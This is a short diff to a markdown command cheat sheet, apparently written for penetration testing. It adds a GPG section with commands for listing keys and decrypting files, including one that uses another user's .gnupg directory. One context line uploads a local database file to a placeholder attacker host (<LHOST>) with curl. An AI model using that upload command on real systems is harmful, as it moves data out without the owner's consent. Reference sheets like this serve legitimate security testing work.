@@ -47,6 +47,7 @@
 - [glab](#glab)
 - [Go](#go)
 - [goshs](#goshs)
+- [gpg](#gpg)
 - [grep](#grep)
 - [grpc](#grpc)
 - [host](#host)
@@ -3397,6 +3398,22 @@ $ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -si -b <USERNAME>:<PASSWORD
 
 ```c
 $ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
+```
+
+## GPG
+
+### Common Commands
+
+```c
+$ gpg -k
+$ gpg -K
+```
+
+### Decryption
+
+```c
+$ gpg --use-agent --decrypt <FILE>.gpg > <FILE>
+$ gpg --homedir /home/<USERNAME>/.gnupg --pinentry-mode=loopback --use-agent --decrypt <FILE>.gpg > <FILE>
 ```
 
 ## grep
